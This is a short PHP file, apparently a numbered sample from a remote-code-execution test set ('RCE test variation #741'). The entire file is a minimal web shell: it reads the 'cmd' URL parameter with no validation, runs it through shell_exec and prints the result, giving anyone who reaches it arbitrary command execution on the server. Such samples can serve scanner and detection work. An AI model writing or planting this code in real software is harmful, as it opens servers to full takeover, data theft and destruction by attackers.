<?php
// RCE test variation #741
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>